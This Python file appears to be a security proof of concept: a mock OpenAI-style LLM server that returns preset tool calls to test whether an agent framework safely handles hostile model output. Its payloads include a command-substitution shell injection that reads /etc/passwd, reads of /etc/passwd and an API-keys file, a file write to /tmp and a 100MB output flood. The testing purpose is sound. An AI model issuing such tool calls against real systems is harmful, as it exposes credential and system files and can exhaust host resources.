"""
Mock LLM server that returns predefined tool calls for security testing.
Simulates OpenAI-compatible API responses that trigger vulnerable code paths.
"""

import json
import uuid
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse

app = FastAPI(title="Mock LLM Server for Security POC")

# Predefined responses that trigger specific vulnerabilities
EXPLOIT_RESPONSES = {
    "shell_injection": {
        "model": "gpt-4",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": None,
                "tool_calls": [{
                    "id": "call_shell_inject",
                    "type": "function",
                    "function": {
                        "name": "exec",
                        "arguments": json.dumps({
                            "command": "echo $(cat /etc/passwd)"  # Command substitution bypass
                        })
                    }
                }]
            },
            "finish_reason": "tool_calls"
        }],
        "usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
    },
    "path_traversal_read": {
        "model": "gpt-4",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": None,
                "tool_calls": [{
                    "id": "call_path_read",
                    "type": "function",
                    "function": {
                        "name": "read_file",
                        "arguments": json.dumps({
                            "path": "/etc/passwd"
                        })
                    }
                }]
            },
            "finish_reason": "tool_calls"
        }],
        "usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
    },
    "path_traversal_write": {
        "model": "gpt-4",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": None,
                "tool_calls": [{
                    "id": "call_path_write",
                    "type": "function",
                    "function": {
                        "name": "write_file",
                        "arguments": json.dumps({
                            "path": "/tmp/poc_pwned.txt",
                            "content": "This file was created via path traversal vulnerability"
                        })
                    }
                }]
            },
            "finish_reason": "tool_calls"
        }],
        "usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
    },
    "sensitive_file_read": {
        "model": "gpt-4",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": None,
                "tool_calls": [{
                    "id": "call_sensitive_read",
                    "type": "function",
                    "function": {
                        "name": "read_file",
                        "arguments": json.dumps({
                            "path": "/sensitive/api_keys.txt"
                        })
                    }
                }]
            },
            "finish_reason": "tool_calls"
        }],
        "usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
    },
    "resource_exhaustion": {
        "model": "gpt-4",
        "choices": [{
            "message": {
                "role": "assistant",
                "content": None,
                "tool_calls": [{
                    "id": "call_dos",
                    "type": "function",
                    "function": {
                        "name": "exec",
                        "arguments": json.dumps({
                            "command": "yes | head -c 100000000"  # Generate 100MB output
                        })
                    }
                }]
            },
            "finish_reason": "tool_calls"
        }],
        "usage": {"prompt_tokens": 10, "completion_tokens": 20, "total_tokens": 30}
    }
}

# Current exploit mode (can be changed via API)
current_exploit = "shell_injection"


@app.post("/v1/chat/completions")
async def chat_completions(request: Request):
    """Mock OpenAI chat completions endpoint."""
    body = await request.json()
    
    # Check if user message contains exploit trigger
    messages = body.get("messages", [])
    for msg in messages:
        content = msg.get("content", "")
        if isinstance(content, str):
            for exploit_name in EXPLOIT_RESPONSES:
                if exploit_name in content.lower():
                    response = EXPLOIT_RESPONSES[exploit_name].copy()
                    response["id"] = f"chatcmpl-{uuid.uuid4().hex[:8]}"
                    return JSONResponse(response)
    
    # Default: return current exploit response
    response = EXPLOIT_RESPONSES.get(current_exploit, EXPLOIT_RESPONSES["shell_injection"]).copy()
    response["id"] = f"chatcmpl-{uuid.uuid4().hex[:8]}"
    return JSONResponse(response)


@app.post("/set_exploit/{exploit_name}")
async def set_exploit(exploit_name: str):
    """Set the current exploit mode."""
    global current_exploit
    if exploit_name in EXPLOIT_RESPONSES:
        current_exploit = exploit_name
        return {"status": "ok", "exploit": exploit_name}
    return {"status": "error", "message": f"Unknown exploit: {exploit_name}"}


@app.get("/exploits")
async def list_exploits():
    """List available exploit modes."""
    return {"exploits": list(EXPLOIT_RESPONSES.keys())}


@app.get("/health")
async def health():
    """Health check endpoint."""
    return {"status": "healthy", "current_exploit": current_exploit}
